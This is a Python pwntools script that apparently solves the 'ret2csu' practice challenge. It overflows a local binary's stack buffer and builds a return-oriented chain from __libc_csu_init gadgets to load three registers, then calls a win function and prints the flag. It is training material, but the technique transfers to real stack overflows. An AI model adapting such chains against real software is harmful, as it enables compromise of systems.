import time

from pwn import *


EXECUTABLE = "./ret2csu"
context.binary = elf = ELF(EXECUTABLE)
lib_ret2csu = ELF("./libret2csu.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    log.success(f"Offset found: {offset}")
    exit()

# Params for the ret2win function
params = [
    0xdeadbeefdeadbeef, # rdi
    0xcafebabecafebabe, # rsi
    0xd00df00dd00df00d  # rdx
]
rop = ROP(elf)


r12 = 0x600e48 # Pointer to _fini function

payload  = b"A" * OFFSET
# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += p64(elf.sym.__libc_csu_init + 90) + p64(0) + p64(1) + p64(r12) + p64(params[0]) + p64(params[1]) + p64(params[2])
payload += p64(elf.sym.__libc_csu_init + 64)
# mov rdx, r15
# mov rsi, r14
# mov edi, r13d
# call qword [r12 + rbx*8]
# add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
payload += p64(rop.rdi.address) + p64(params[0])
# Call ret2win
payload += p64(elf.plt.ret2win)


p.sendafter(b"> ", payload)
p.recvline() # Thank you

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
